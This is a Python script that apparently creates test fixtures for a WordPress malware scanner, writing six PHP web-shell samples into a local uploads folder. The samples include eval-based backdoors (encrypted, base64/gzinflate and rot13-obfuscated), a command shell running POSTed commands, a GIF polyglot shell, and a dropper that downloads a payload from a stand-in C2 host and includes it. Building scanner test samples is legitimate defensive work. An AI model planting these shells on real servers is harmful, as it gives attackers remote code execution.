import os

test_dir = r"C:\xampp\htdocs\mahabub\wp-content\uploads\mdefender_test_threats"
os.makedirs(test_dir, exist_ok=True)

samples = {
    "godzilla_behinder_sample.php": '<?php\n@session_start();\n$key="e45e329feb5d925b";\n$post=file_get_contents("php://input");\nif(!empty($post)){\n    $data=openssl_decrypt($post, "AES128", $key);\n    @eval($data);\n}\n?>',
    "wso_backdoor.php": '<?php\n$auth_pass = "63a9f0ea7bb98050796b649e85481845";\n$color = "#df5";\n$default_action = "FilesMan";\n$default_use_ajax = true;\n$default_charset = "UTF-8";\neval(gzinflate(base64_decode("7b0HYBxJliUmL23Ke39K9UrX4HShCIBgEyTYAIdyhxKJxIIASFKWWZN54m7LsPjmBkEyRIxmITs=")));\n?>',
    "c99_shell_sim.php": '<?php\n// c99shell v. 1.0\n$c99sh_version = "1.0";\nif(isset($_POST["cmd"])){\n    $cmd = $_POST["cmd"];\n    system($cmd);\n    passthru($cmd);\n    exec($cmd, $out);\n}\n?>',
    "polyglot_image_shell.jpg.php": 'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;<?php @eval($_POST["cmd"]); ?>',
    "obfuscated_eval_rot13.php": '<?php\n$a = str_rot13("riny");\n$b = str_rot13("cuc_vasb(); flfgrz($_TRG[\"k\"]);");\n$a($b);\n?>',
    "sandrive_trojan_dropper.php": '<?php\n$url = "http://malicious-c2-server.xyz/payload.bin";\n$fp = fopen("wp-content/uploads/shell.php", "w+");\n$ch = curl_init($url);\ncurl_setopt($ch, CURLOPT_FILE, $fp);\ncurl_exec($ch);\ncurl_close($ch);\nfclose($fp);\ninclude("wp-content/uploads/shell.php");\n?>'
}

for name, content in samples.items():
    p = os.path.join(test_dir, name)
    with open(p, "w", encoding="utf-8", errors="ignore") as f:
        f.write(content)
    print(f"Created test sample: {p}")

print("All 6 modern threat vectors created in uploads folder.")
